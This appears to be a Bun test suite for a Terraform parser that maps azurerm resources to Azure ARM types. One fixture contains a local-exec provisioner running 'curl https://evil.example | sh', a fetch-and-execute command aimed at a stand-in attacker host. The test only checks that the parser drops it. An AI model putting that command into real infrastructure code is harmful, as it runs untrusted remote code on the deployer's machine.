import { describe, expect, test } from "bun:test";
import { existsSync, readFileSync } from "node:fs";
import { join } from "node:path";
import { Glob } from "bun";
import { IAC_LIMITS, type IacExpr, type IacFileFacts, type IacSymbolKind } from "../../../src/azure/iac/model.ts";
import { parseTerraform } from "../../../src/azure/iac/terraform.ts";
import { AZURERM_TYPES, azurermMapping } from "../../../src/azure/iac/terraform-azurerm.ts";

const parse = (text: string, file = "infra/main.tf"): IacFileFacts => parseTerraform(file, text);
const ok = (text: string, file?: string): IacFileFacts => {
  const facts = parse(text, file);
  expect(facts.errors).toEqual([]);
  return facts;
};
const local = (text: string, name = "x"): IacExpr => ok(`locals {\n  ${name} = ${text}\n}\n`).variables.find((v) => v.name === name)!.value;
const entry = (e: IacExpr, key: string): IacExpr | undefined => (e.kind === "object" ? e.entries.find((x) => x.key === key)?.value : undefined);
const ref = (kind: IacSymbolKind, name: string, path: string[] = []): IacExpr => ({ kind: "reference", target: { kind, name }, path });
const str = (value: string): IacExpr => ({ kind: "string", value });
const num = (value: number): IacExpr => ({ kind: "number", value });

describe("terraform expressions", () => {
  test("literals", () => {
    expect(local("42")).toEqual(num(42));
    expect(local("1.5e3")).toEqual(num(1500));
    expect(local("-7")).toEqual(num(-7));
    expect(local("true")).toEqual({ kind: "bool", value: true });
    expect(local("false")).toEqual({ kind: "bool", value: false });
    expect(local("null")).toEqual({ kind: "null" });
  });

  test("strings with escapes and literal sequences", () => {
    expect(local(String.raw`"a\nb\t\"c\" \\ \u00e9 \U0001F600"`)).toEqual(str('a\nb\t"c" \\ é 😀'));
    expect(local('"$${x} %%{y}"')).toEqual(str("${x} %{y}"));
    expect(local('""')).toEqual(str(""));
  });

  test("interpolation", () => {
    expect(local('"pre-${var.a}-${local.b}"')).toEqual({ kind: "interpolation", parts: ["pre-", ref("parameter", "a"), "-", ref("variable", "b")] });
    expect(local('"${var.a}"')).toEqual(ref("parameter", "a"));
    expect(local('"${ "inner-${var.a}" }"')).toEqual({ kind: "interpolation", parts: ["inner-", ref("parameter", "a")] });
    expect(local('"a  ${~ var.x ~}  b"')).toEqual({ kind: "interpolation", parts: ["a", ref("parameter", "x"), "b"] });
  });

  test("template directives become unknown with references", () => {
    const e = local('"%{ if var.on }yes-${local.y}%{ else }no%{ endif }"');
    expect(e.kind).toBe("unknown");
    if (e.kind !== "unknown") return;
    expect(e.text).toBe('"%{ if var.on }yes-${local.y}%{ else }no%{ endif }"');
    expect(e.references).toEqual([
      { target: { kind: "parameter", name: "on" }, path: [] },
      { target: { kind: "variable", name: "y" }, path: [] },
    ]);
    const f = local('"%{ for s in var.list }${s.id},%{ endfor }"');
    expect(f.kind === "unknown" && f.references).toEqual([
      { target: { kind: "parameter", name: "list" }, path: [] },
      { target: { kind: "loop", name: "s" }, path: ["id"] },
    ]);
  });

  test("heredocs", () => {
    expect(local("<<EOF\n  line ${var.a}\n    two\nEOF")).toEqual({ kind: "interpolation", parts: ["  line ", ref("parameter", "a"), "\n    two\n"] });
    expect(local("<<-EOT\n    one\n      two\n\n    ${var.b}\n    EOT")).toEqual({ kind: "interpolation", parts: ["one\n  two\n\n", ref("parameter", "b"), "\n"] });
    expect(local("<<EOF\nno escapes \\n here\nEOF")).toEqual(str("no escapes \\n here\n"));
    expect(local("<<EOF\r\nwin\r\nEOF")).toEqual(str("win\n"));
  });

  test("tuples and objects", () => {
    expect(local('[1, "a",\n  var.x,\n]')).toEqual({ kind: "array", items: [num(1), str("a"), ref("parameter", "x")] });
    const o = local('{\n    a = 1\n    b: 2, "c-d" = 3\n    "e" : [ ]\n    1 = "n"\n  }');
    expect(o.kind === "object" && o.entries.map((e) => [e.key, e.value])).toEqual([
      ["a", num(1)],
      ["b", num(2)],
      ["c-d", num(3)],
      ["e", { kind: "array", items: [] }],
      ["1", str("n")],
    ]);
    expect(o.kind === "object" && o.entries[0]!.location).toEqual({ line: 3, column: 5, endLine: 3, endColumn: 10 });
    expect(local("{}")).toEqual({ kind: "object", entries: [] });
  });

  test("computed object keys make the object unknown", () => {
    const e = local("{ (var.k) = 1, b = local.v }");
    expect(e.kind).toBe("unknown");
    expect(e.kind === "unknown" && e.references.map((r) => r.target.name)).toEqual(["k", "v"]);
    expect(local('{ "${var.k}" = 1 }').kind).toBe("unknown");
  });

  test("references", () => {
    expect(local("var.x.y")).toEqual(ref("parameter", "x", ["y"]));
    expect(local("local.cfg.a")).toEqual(ref("variable", "cfg", ["a"]));
    expect(local("module.m.out")).toEqual(ref("module", "m", ["out"]));
    expect(local("data.azurerm_client_config.current.tenant_id")).toEqual(ref("data", "azurerm_client_config.current", ["tenant_id"]));
    expect(local("azurerm_servicebus_topic.orders.id")).toEqual(ref("resource", "azurerm_servicebus_topic.orders", ["id"]));
    expect(local("each.value.name")).toEqual(ref("loop", "each", ["value", "name"]));
    expect(local("each.key")).toEqual(ref("loop", "each", ["key"]));
    expect(local("count.index")).toEqual(ref("loop", "count", ["index"]));
    expect(local("path.module")).toEqual({ kind: "call", name: "path.module", args: [] });
    expect(local("path.root")).toEqual({ kind: "call", name: "path.root", args: [] });
    expect(local("terraform.workspace")).toEqual({ kind: "call", name: "terraform.workspace", args: [] });
    expect(local("self.id")).toEqual(ref("unknown", "self", ["id"]));
  });

  test("index, splat and legacy access", () => {
    expect(local("azurerm_subnet.s[0].id")).toEqual(ref("resource", "azurerm_subnet.s", ["0", "id"]));
    expect(local('local.m["k"].v')).toEqual(ref("variable", "m", ["k", "v"]));
    expect(local("local.m[each.key]")).toEqual(ref("variable", "m", ["*"]));
    expect(local("azurerm_subnet.s[*].id")).toEqual(ref("resource", "azurerm_subnet.s", ["*", "id"]));
    expect(local("azurerm_subnet.s.*.id")).toEqual(ref("resource", "azurerm_subnet.s", ["*", "id"]));
    expect(local("var.list.0.name")).toEqual(ref("parameter", "list", ["0", "name"]));
    expect(local("(var.a).b")).toEqual(ref("parameter", "a", ["b"]));
    const u = local("[var.a, var.b][0]");
    expect(u.kind === "unknown" && u.text).toBe("[var.a, var.b][0]");
  });

  test("function calls", () => {
    expect(local('lower(replace(var.n, "-", ""))')).toEqual({ kind: "call", name: "lower", args: [{ kind: "call", name: "replace", args: [ref("parameter", "n"), str("-"), str("")] }] });
    expect(local("provider::azurerm::normalise_resource_id(var.id)")).toEqual({ kind: "call", name: "provider::azurerm::normalise_resource_id", args: [ref("parameter", "id")] });
    expect(local("merge(\n  var.a,\n  var.b,\n)")).toEqual({ kind: "call", name: "merge", args: [ref("parameter", "a"), ref("parameter", "b")] });
    expect(local("jsondecode(var.j).x")).toEqual({ kind: "call", name: "jsondecode", args: [ref("parameter", "j")], path: ["x"] });
    const spread = local("concat(var.lists...)");
    expect(spread.kind === "unknown" && spread.references).toEqual([{ target: { kind: "parameter", name: "lists" }, path: [] }]);
  });

  test("conditional, operators and parentheses", () => {
    expect(local("var.on ? local.a : null")).toEqual({ kind: "conditional", condition: ref("parameter", "on"), whenTrue: ref("variable", "a"), whenFalse: { kind: "null" } });
    const op = local('var.a == "x" && !var.b || length(local.c) > 0');
    expect(op.kind).toBe("unknown");
    expect(op.kind === "unknown" && op.text).toBe('var.a == "x" && !var.b || length(local.c) > 0');
    expect(op.kind === "unknown" && op.references.map((r) => r.target.name)).toEqual(["a", "b", "c"]);
    expect(local("(var.x)")).toEqual(ref("parameter", "x"));
    expect(local("(\n  var.on\n  ? 1\n  : 2\n)")).toEqual({ kind: "conditional", condition: ref("parameter", "on"), whenTrue: num(1), whenFalse: num(2) });
    expect(local("!var.x").kind).toBe("unknown");
    expect(local("-var.x").kind).toBe("unknown");
  });

  test("for expressions", () => {
    const t = local("[for s in var.subnets : s.id if s.enabled]");
    expect(t.kind === "unknown" && t.references).toEqual([
      { target: { kind: "parameter", name: "subnets" }, path: [] },
      { target: { kind: "loop", name: "s" }, path: ["id"] },
      { target: { kind: "loop", name: "s" }, path: ["enabled"] },
    ]);
    const o = local("{\n  for k, v in local.m :\n    k => azurerm_x.y[v].id...\n}");
    expect(o.kind === "unknown" && o.references.map((r) => `${r.target.kind}:${r.target.name}`)).toEqual(["variable:m", "loop:k", "resource:azurerm_x.y"]);
  });

  test("comments and CRLF", () => {
    const facts = ok('# hash\r\n// slash\r\n/* block\r\n comment */\r\nlocals {\r\n  a = "x" # trailing\r\n  b = /* inline */ 2\r\n}\r\n');
    expect(facts.variables.map((v) => [v.name, v.value])).toEqual([
      ["a", str("x")],
      ["b", num(2)],
    ]);
    expect(facts.variables[0]!.location).toEqual({ line: 6, column: 3, endLine: 6, endColumn: 10 });
  });
});

describe("terraform blocks", () => {
  test("terraform, provider, variables, outputs", () => {
    const facts = ok(`
terraform {
  required_version = ">= 1.5"
  required_providers {
    azurerm = { source = "hashicorp/azurerm", version = "~> 4.0" }
    azurecaf = { source = "aztfmod/azurecaf" }
  }
  backend "azurerm" {}
}
provider "azurerm" {
  features {}
}
provider "azapi" {}
variable "location" {
  type        = string
  default     = "westeurope"
  description = "Region"
}
variable "password" {
  type      = string
  default   = "hunter2"
  sensitive = true
}
variable "cfg" {
  type = object({
    name = optional(string, "x")
  })
  validation {
    condition     = length(var.cfg.name) > 0
    error_message = "bad"
  }
}
output "endpoint" {
  value = azurerm_servicebus_namespace.sb.endpoint
}
output "conn" {
  value     = azurerm_servicebus_namespace.sb.default_primary_connection_string
  sensitive = true
}
moved {
  from = azurerm_x.a
  to   = azurerm_x.b
}
import {
  to = azurerm_resource_group.rg
  id = "/subscriptions/x"
}
check "health" {
  assert {
    condition     = true
    error_message = "x"
  }
}
removed {
  from = azurerm_x.c
}
`);
    expect(facts.providers).toEqual(["azapi", "azurecaf", "azurerm"]);
    expect(facts.parameters.map((p) => [p.name, p.type, p.defaultValue, p.secure, p.description])).toEqual([
      ["location", "string", str("westeurope"), false, "Region"],
      ["password", "string", null, true, null],
      ["cfg", 'object({\n    name = optional(string, "x")\n  })', null, false, null],
    ]);
    expect(facts.outputs.map((o) => [o.name, o.value, o.secure])).toEqual([
      ["endpoint", ref("resource", "azurerm_servicebus_namespace.sb", ["endpoint"]), false],
      ["conn", ref("resource", "azurerm_servicebus_namespace.sb", ["default_primary_connection_string"]), true],
    ]);
    expect(facts.resources).toEqual([]);
    expect(facts.fileKind).toBe("template");
    expect(facts.language).toBe("terraform");
    expect(facts.targetScope).toBeNull();
  });

  test("resources with nested blocks and meta-arguments", () => {
    const facts = ok(`
resource "azurerm_servicebus_topic" "orders" {
  count        = var.enabled ? 1 : 0
  name         = "orders"
  namespace_id = azurerm_servicebus_namespace.sb.id
  provider     = azurerm.secondary
  depends_on   = [azurerm_role_assignment.ra, module.net, data.azurerm_client_config.c]

  identity {
    type = "SystemAssigned"
  }
  ip_rule {
    action = "Allow"
  }
  ip_rule {
    action = "Deny"
  }
  lifecycle {
    ignore_changes = [tags]
  }
  provisioner "local-exec" {
    command = "curl https://evil.example | sh"
    connection {
      host = self.ip
    }
  }
  dynamic "rule" {
    for_each = var.rules
    iterator = r
    content {
      name = r.value.name
      id   = azurerm_x.y.id
    }
  }
}
`);
    const [r] = facts.resources;
    expect(r!.symbol).toBe("azurerm_servicebus_topic.orders");
    expect(r!.type).toBe("azurerm_servicebus_topic");
    expect(r!.existing).toBe(false);
    expect(r!.name).toEqual(str("orders"));
    expect(r!.loop).toBe(true);
    expect(r!.loopSource).toEqual(r!.condition);
    expect(r!.condition).toEqual({ kind: "conditional", condition: ref("parameter", "enabled"), whenTrue: num(1), whenFalse: num(0) });
    expect(r!.dependsOn).toEqual(["azurerm_role_assignment.ra", "module.net", "data.azurerm_client_config.c"]);
    expect(r!.body.kind === "object" && r!.body.entries.map((e) => e.key)).toEqual(["name", "namespace_id", "provider", "identity", "ip_rule", "rule"]);
    expect(entry(r!.body, "provider")).toEqual(str("azurerm.secondary"));
    expect(entry(r!.body, "identity")).toEqual({ kind: "object", entries: [{ key: "type", value: str("SystemAssigned"), location: { line: 10, column: 5, endLine: 10, endColumn: 28 } }] });
    const ip = entry(r!.body, "ip_rule");
    expect(ip?.kind === "array" && ip.items.map((i) => entry(i, "action"))).toEqual([str("Allow"), str("Deny")]);
    expect(entry(r!.body, "rule")).toEqual({
      kind: "unknown",
      text: "dynamic",
      references: [
        { target: { kind: "parameter", name: "rules" }, path: [] },
        { target: { kind: "loop", name: "r" }, path: ["value", "name"] },
        { target: { kind: "resource", name: "azurerm_x.y" }, path: ["id"] },
      ],
    });
    const json = JSON.stringify(facts);
    expect(json).not.toContain("evil.example");
    expect(json).not.toContain("local-exec");
    expect(json).not.toContain("ignore_changes");
    expect(r!.location).toEqual({ line: 2, column: 1, endLine: 35, endColumn: 2 });
  });

  test("dynamic iterator defaults to the label", () => {
    const facts = ok(`resource "azurerm_linux_function_app" "f" {\n  name = "f"\n  dynamic "site_config" {\n    for_each = local.cfgs\n    content {\n      x = site_config.value\n    }\n  }\n}\n`);
    expect(entry(facts.resources[0]!.body, "site_config")).toEqual({
      kind: "unknown",
      text: "dynamic",
      references: [
        { target: { kind: "variable", name: "cfgs" }, path: [] },
        { target: { kind: "loop", name: "site_config" }, path: ["value"] },
      ],
    });
  });

  test("for_each, data sources and name attributes from the mapping", () => {
    const facts = ok(`
resource "azurerm_servicebus_queue" "q" {
  for_each     = toset(var.queues)
  name         = each.key
  namespace_id = azurerm_servicebus_namespace.sb.id
}
data "azurerm_resource_group" "rg" {
  name = var.rg
}
resource "azurerm_key_vault_access_policy" "p" {
  key_vault_id = azurerm_key_vault.kv.id
}
resource "azurerm_app_configuration_key" "k" {
  key = "Settings:A"
}
resource "random_string" "s" {
  length = 8
}
resource "azurerm_x" "c" {
  count = var.n
}
`);
    const [q, rg, p, k, s, c] = facts.resources;
    expect(q!.loop).toBe(true);
    expect(q!.loopSource).toEqual({ kind: "call", name: "toset", args: [ref("parameter", "queues")] });
    expect(q!.condition).toBeNull();
    expect(q!.name).toEqual(ref("loop", "each", ["key"]));
    expect(q!.body.kind === "object" && q!.body.entries.map((e) => e.key)).toEqual(["name", "namespace_id"]);
    expect(rg!.symbol).toBe("data.azurerm_resource_group.rg");
    expect(rg!.existing).toBe(true);
    expect(rg!.name).toEqual(ref("parameter", "rg"));
    expect(p!.name).toEqual({ kind: "null" });
    expect(k!.name).toEqual(str("Settings:A"));
    expect(s!.name).toEqual({ kind: "null" });
    expect(c!.loop).toBe(true);
    expect(c!.condition).toBeNull();
    expect(facts.resources.every((r) => r.apiVersion === null && r.parent === null)).toBe(true);
  });

  test("modules", () => {
    const facts = ok(`
module "net" {
  source     = "./modules/network"
  count      = var.deploy ? 1 : 0
  vnet_name  = local.vnet
  depends_on = [azurerm_resource_group.rg]
  providers  = { azurerm = azurerm.hub }
}
module "up" {
  source = "../../shared/x"
}
module "escape" {
  source = "../../../outside"
}
module "reg" {
  source   = "Azure/avm-res-servicebus-namespace/azurerm"
  version  = "0.4.0"
  for_each = var.envs
}
module "git" {
  source = "git::https://example.com/x.git//sub?ref=v1"
}
`, "envs/prod/main.tf");
    expect(facts.modules.map((m) => [m.symbol, m.source, m.localPath, m.loop])).toEqual([
      ["net", "./modules/network", "envs/prod/modules/network", true],
      ["up", "../../shared/x", "shared/x", false],
      ["escape", "../../../outside", null, false],
      ["reg", "Azure/avm-res-servicebus-namespace/azurerm", null, true],
      ["git", "git::https://example.com/x.git//sub?ref=v1", null, false],
    ]);
    const net = facts.modules[0]!;
    expect(net.params).toEqual({ kind: "object", entries: [{ key: "vnet_name", value: ref("variable", "vnet"), location: { line: 5, column: 3, endLine: 5, endColumn: 26 } }] });
    expect(net.condition?.kind).toBe("conditional");
    expect(net.dependsOn).toEqual(["azurerm_resource_group.rg"]);
    expect(net.name).toBeNull();
    expect(net.scope).toBeNull();
    expect(parse('module "root" {\n  source = "../"\n}\n', "infra/main.tf").modules[0]!.localPath).toBe(".");
  });

  test("one-line blocks and labels as identifiers", () => {
    const facts = ok('resource azurerm_resource_group rg { name = "rg" }\nprovider "azurerm" { features {} }\n');
    expect(facts.resources[0]!.symbol).toBe("azurerm_resource_group.rg");
    expect(facts.providers).toEqual(["azurerm"]);
  });
});

describe("terraform parameter files", () => {
  test(".tfvars", () => {
    const facts = ok('location = "westeurope"\ntags = {\n  env = "prod"\n}\nsizes = [1, 2]\n', "infra/prod.tfvars");
    expect(facts.fileKind).toBe("parameters");
    expect(facts.parameters.map((p) => [p.name, p.defaultValue, p.secure, p.type])).toEqual([
      ["location", str("westeurope"), false, null],
      ["tags", { kind: "object", entries: [{ key: "env", value: str("prod"), location: { line: 3, column: 3, endLine: 3, endColumn: 15 } }] }, false, null],
      ["sizes", { kind: "array", items: [num(1), num(2)] }, false, null],
    ]);
    expect(parse('x = 1\nblock {}\n', "a.tfvars").errors.map((e) => e.message)).toEqual(["blocks are not allowed in a variable definitions file"]);
  });

  test(".tfvars.json", () => {
    const facts = ok('{\n  "location": "${AZURE_LOCATION}",\n  "n": -1.5e2,\n  "flags": [true, false, null],\n  "obj": {"a\\u0041": {"b": "\\n"}}\n}', "infra/main.tfvars.json");
    expect(facts.fileKind).toBe("parameters");
    expect(facts.parameters.map((p) => [p.name, p.defaultValue])).toEqual([
      ["location", str("${AZURE_LOCATION}")],
      ["n", num(-150)],
      ["flags", { kind: "array", items: [{ kind: "bool", value: true }, { kind: "bool", value: false }, { kind: "null" }] }],
      ["obj", { kind: "object", entries: [{ key: "aA", value: { kind: "object", entries: [{ key: "b", value: str("\n"), location: { line: 5, column: 23, endLine: 5, endColumn: 32 } }] }, location: { line: 5, column: 11, endLine: 5, endColumn: 33 } }] }],
    ]);
    expect(facts.parameters[0]!.location).toEqual({ line: 2, column: 3, endLine: 2, endColumn: 34 });
    expect(parse('{"a": 1,}', "x.tfvars.json").errors).toEqual([{ message: "expected property name", line: 1, column: 9 }]);
    expect(parse("[1]", "x.tfvars.json").errors[0]!.message).toBe("expected a JSON object");
  });

  test(".tf.json is reported as unsupported", () => {
    expect(parse('{"resource": {}}', "main.tf.json").errors[0]!.message).toContain("not supported");
  });
});

describe("terraform robustness", () => {
  const timed = (text: string, file = "main.tf"): IacFileFacts => {
    const start = performance.now();
    const facts = parse(text, file);
    expect(performance.now() - start).toBeLessThan(5000);
    expect(facts.errors.some((e) => e.message.startsWith("internal parser error"))).toBe(false);
    return facts;
  };

  test("errors carry 1-based positions and parsing continues", () => {
    const facts = parse('locals {\n  a = 1 +\n  b = "ok"\n  c = )\n}\nresource "azurerm_x" "y" {\n  name = "n"\n}\n');
    expect(facts.errors[0]).toEqual({ message: "expected expression, found newline", line: 2, column: 10 });
    expect(facts.errors.length).toBeGreaterThan(1);
    expect(facts.variables.map((v) => v.name)).toEqual(["a", "b", "c"]);
    expect(facts.resources.map((r) => r.symbol)).toEqual(["azurerm_x.y"]);
  });

  test("unterminated constructs", () => {
    expect(timed('locals {\n  a = "never closed\n  b = 2\n}\n').errors[0]).toEqual({ message: "unterminated string", line: 2, column: 7 });
    expect(timed("locals {\n  a = 1\n}\n/* open comment").errors).toEqual([{ message: "unterminated comment", line: 4, column: 1 }]);
    expect(timed("locals {\n  a = <<EOF\n  text\n").errors[0]).toEqual({ message: "unterminated heredoc (missing EOF)", line: 2, column: 7 });
    expect(timed('locals {\n  a = "${var.x\n}\n').errors.length).toBeGreaterThan(0);
    expect(timed('resource "a" "b" {\n  x = 1\n').errors.map((e) => e.message)).toEqual(["missing '}' for block 'resource' opened at line 1"]);
    expect(timed('locals {\n  a = "\\q"\n}\n').errors[0]!.message).toBe("invalid escape sequence '\\q'");
  });

  test("deep nesting becomes unknown without overflowing", () => {
    for (const [open, close] of [["(", ")"], ["[", "]"], ["{a = ", "}"], ['"${', '}"'], ["f(", ")"]] as const) {
      const depth = 50_000;
      const facts = timed(`locals {\n  x = ${open.repeat(depth)}var.v${close.repeat(depth)}\n}\n`);
      expect(facts.errors).toEqual([]);
      let e: IacExpr = facts.variables[0]!.value;
      let levels = 0;
      while (e.kind !== "unknown" && levels < 1000) {
        e = e.kind === "array" ? e.items[0]! : e.kind === "object" ? e.entries[0]!.value : e.kind === "call" ? e.args[0]! : e.kind === "interpolation" ? (e.parts[0] as IacExpr) : e;
        levels++;
      }
      expect(e.kind).toBe("unknown");
      expect(levels).toBeLessThanOrEqual(IAC_LIMITS.maxDepth + 1);
      expect(e.kind === "unknown" && e.references).toEqual([{ target: { kind: "parameter", name: "v" }, path: [] }]);
    }
    const blocks = timed(`resource "azurerm_x" "y" {\n${"a {\n".repeat(20_000)}x = var.deep\n${"}\n".repeat(20_001)}`);
    expect(blocks.errors).toEqual([]);
    let body: IacExpr | undefined = blocks.resources[0]!.body;
    for (let k = 0; k < IAC_LIMITS.maxDepth && body?.kind === "object"; k++) body = entry(body, "a");
    expect(body?.kind === "unknown" && body.references).toEqual([{ target: { kind: "parameter", name: "deep" }, path: [] }]);
    const conds = timed(`locals {\n  x = ${"var.a ? 1 : ".repeat(20_000)}0\n}\n`);
    expect(conds.errors).toEqual([]);
    const unary = timed(`locals {\n  x = ${"!".repeat(100_000)}var.a\n}\n`);
    expect(unary.variables[0]!.value.kind).toBe("unknown");
    const chain = timed(`locals {\n  x = ${Array.from({ length: 50_000 }, (_, i) => `var.v${i}`).join(" + ")}\n}\n`);
    expect(chain.variables[0]!.value.kind === "unknown" && chain.variables[0]!.value.references.length).toBe(50_000);
    const deepJson = timed(`{"a": ${"[".repeat(100_000)}${"]".repeat(100_000)}}`, "x.tfvars.json");
    expect(deepJson.errors).toEqual([]);
    expect(deepJson.parameters[0]!.defaultValue).not.toBeNull();
  });

  test("huge strings, size limit and garbage input", () => {
    const big = timed(`locals {\n  s = "${"x".repeat(2_000_000)}"\n}\n`);
    expect(big.variables[0]!.value.kind === "string" && big.variables[0]!.value.value.length).toBe(2_000_000);
    timed(`locals {\n  s = "${"\\n".repeat(500_000)}`);
    timed(`a = <<EOF\n${"line\n".repeat(200_000)}`);
    const tooBig = parse("#".repeat(IAC_LIMITS.maxBytes + 1));
    expect(tooBig.errors).toEqual([{ message: `file exceeds ${IAC_LIMITS.maxBytes} bytes`, line: 1, column: 1 }]);
    const many = timed("}\n".repeat(10_000));
    expect(many.errors.length).toBe(101);
    expect(many.errors[100]!.message).toBe("too many errors");
    let seed = 12345;
    const rand = () => (seed = (seed * 1103515245 + 12345) & 0x7fffffff) / 0x7fffffff;
    const alphabet = ['"', "{", "}", "[", "]", "(", ")", "$", "%", "~", "<<EOF\n", "EOF\n", "\n", " ", "=", ":", ",", ".", "*", "?", "\\", "#", "/*", "*/", "a", "var", "for", "in", "if", "1", "-", "=>", "..."];
    for (let k = 0; k < 2000; k++) {
      const text = Array.from({ length: 1 + Math.floor(rand() * 60) }, () => alphabet[Math.floor(rand() * alphabet.length)]).join("");
      for (const file of ["main.tf", "x.tfvars", "x.tfvars.json"]) {
        const facts = parse(text, file);
        expect(facts.errors.some((e) => e.message.startsWith("internal parser error"))).toBe(false);
        for (const e of facts.errors) expect(e.line >= 1 && e.column >= 1).toBe(true);
      }
    }
  });

  test("deterministic output", () => {
    const text = 'locals {\n  a = { b = [for x in var.y : x], c = "${var.z}" }\n}\nresource "azurerm_x" "y" {\n  dynamic "d" {\n    for_each = var.q\n    content { v = d.value }\n  }\n}\n';
    expect(JSON.stringify(parse(text))).toBe(JSON.stringify(parse(text)));
  });
});

describe("azurerm mapping", () => {
  test("canonical ARM types and parents", () => {
    expect(azurermMapping("azurerm_servicebus_topic")).toEqual({ armType: "Microsoft.ServiceBus/namespaces/topics", nameAttribute: "name", parents: [{ attribute: "namespace_id", form: "id", armType: "Microsoft.ServiceBus/namespaces" }] });
    expect(azurermMapping("azurerm_eventhub")!.parents).toEqual([
      { attribute: "namespace_name", form: "name", armType: "Microsoft.EventHub/namespaces" },
      { attribute: "namespace_id", form: "id", armType: "Microsoft.EventHub/namespaces" },
    ]);
    expect(azurermMapping("azurerm_storage_container")).toEqual({
      armType: "Microsoft.Storage/storageAccounts/blobServices/containers",
      nameAttribute: "name",
      parents: [
        { attribute: "storage_account_name", form: "name", armType: "Microsoft.Storage/storageAccounts" },
        { attribute: "storage_account_id", form: "id", armType: "Microsoft.Storage/storageAccounts" },
      ],
    });
    expect(azurermMapping("azurerm_cosmosdb_sql_container")!.parents).toEqual([
      { attribute: "account_name", form: "name", armType: "Microsoft.DocumentDB/databaseAccounts" },
      { attribute: "database_name", form: "name", armType: "Microsoft.DocumentDB/databaseAccounts/sqlDatabases" },
    ]);
    expect(azurermMapping("azurerm_linux_function_app")).toEqual({ armType: "Microsoft.Web/sites", nameAttribute: "name", parents: [], kind: "functionapp,linux" });
    expect(azurermMapping("azurerm_static_web_app")!.armType).toBe("Microsoft.Web/staticSites");
    expect(azurermMapping("azurerm_api_management_api_operation")!.nameAttribute).toBe("operation_id");
    expect(azurermMapping("azurerm_resource_group")!.armType).toBe("Microsoft.Resources/resourceGroups");
    expect(azurermMapping("azurerm_unknown_thing")).toBeNull();
    expect(azurermMapping("toString")).toBeNull();
  });

  test("required coverage", () => {
    const required = "resource_group servicebus_namespace servicebus_queue servicebus_topic servicebus_subscription servicebus_subscription_rule eventhub_namespace eventhub eventhub_consumer_group eventgrid_topic eventgrid_system_topic eventgrid_event_subscription eventgrid_system_topic_event_subscription eventgrid_domain storage_account storage_container storage_queue storage_table storage_share cosmosdb_account cosmosdb_sql_database cosmosdb_sql_container cosmosdb_mongo_database cosmosdb_mongo_collection mssql_server mssql_database sql_server sql_database postgresql_flexible_server postgresql_flexible_server_database mysql_flexible_server redis_cache key_vault key_vault_secret key_vault_key key_vault_certificate key_vault_access_policy service_plan app_service_plan linux_function_app windows_function_app function_app function_app_flex_consumption linux_function_app_slot linux_web_app windows_web_app app_service static_web_app container_app container_app_environment container_app_job container_registry kubernetes_cluster api_management api_management_api api_management_api_operation api_management_api_policy api_management_backend api_management_product api_management_named_value api_management_subscription application_insights log_analytics_workspace monitor_diagnostic_setting user_assigned_identity role_assignment role_definition virtual_network subnet private_endpoint private_dns_zone private_dns_zone_virtual_network_link network_security_group public_ip application_gateway frontdoor cdn_frontdoor_profile cdn_frontdoor_endpoint cdn_frontdoor_origin_group cdn_frontdoor_origin cdn_frontdoor_route app_configuration app_configuration_key signalr_service logic_app_workflow".split(" ");
    expect(required.filter((t) => !azurermMapping(`azurerm_${t}`))).toEqual([]);
    for (const [type, m] of Object.entries(AZURERM_TYPES)) {
      expect(type.startsWith("azurerm_")).toBe(true);
      expect(m.armType).toMatch(/^Microsoft\.[A-Za-z]+\/[A-Za-z]+(\/[A-Za-z]+)*$/);
      for (const p of m.parents) expect(m.armType.startsWith(`${p.armType}/`)).toBe(true);
    }
  });
});

const CORPORA = [join(process.env.HOME ?? "", ".capy/work/repos"), join(process.env.HOME ?? "", ".capy/work/repos-tf")];

describe("terraform corpus", () => {
  const files = CORPORA.filter((root) => existsSync(root)).flatMap((root) =>
    [...new Glob("**/*.{tf,tfvars,tfvars.json}").scanSync({ cwd: root })].filter((f) => !f.split("/").includes(".git") && !f.includes("node_modules")).sort().map((f) => ({ root, f })),
  );

  test.skipIf(!files.length)("every Terraform file in the corpora parses without errors", () => {
    const failures: string[] = [];
    let declarations = 0;
    for (const { root, f } of files) {
      const text = readFileSync(join(root, f), "utf8");
      const facts = parseTerraform(f, text);
      declarations += facts.resources.length + facts.modules.length + facts.parameters.length + facts.variables.length + facts.outputs.length;
      for (const e of facts.errors) failures.push(`${f}:${e.line}:${e.column} ${e.message}`);
      expect(JSON.stringify(parseTerraform(f, text))).toBe(JSON.stringify(facts));
      for (const cut of [0.25, 0.5, 0.75]) {
        const partial = parseTerraform(f, text.slice(0, Math.floor(text.length * cut)));
        expect(partial.errors.some((e) => e.message.startsWith("internal parser error"))).toBe(false);
      }
    }
    expect(failures).toEqual([]);
    expect(declarations).toBeGreaterThan(0);
  });

  test.skipIf(!existsSync(join(CORPORA[0]!, "functions-quickstart-dotnet-azd-tf/infra")))("functions-quickstart-dotnet-azd-tf", () => {
    const dir = join(CORPORA[0]!, "functions-quickstart-dotnet-azd-tf/infra");
    const main = parseTerraform("infra/main.tf", readFileSync(join(dir, "main.tf"), "utf8"));
    expect(main.errors).toEqual([]);
    const container = main.resources.find((r) => r.symbol === "azurerm_storage_container.deployment_package")!;
    expect(container.dependsOn).toEqual(["azurerm_role_assignment.storage_blob_data_owner_deployer"]);
    expect(entry(container.body, "storage_account_id")).toEqual(ref("resource", "azurerm_storage_account.function_storage", ["id"]));
    expect(main.resources.some((r) => r.type === "azurerm_function_app_flex_consumption")).toBe(true);
    const vars = parseTerraform("infra/main.tfvars.json", readFileSync(join(dir, "main.tfvars.json"), "utf8"));
    expect(vars.parameters.map((p) => [p.name, p.defaultValue])).toEqual([
      ["location", str("${AZURE_LOCATION}")],
      ["environment_name", str("${AZURE_ENV_NAME}")],
    ]);
    const provider = parseTerraform("infra/provider.tf", readFileSync(join(dir, "provider.tf"), "utf8"));
    expect(provider.providers).toContain("azurerm");
  });
});
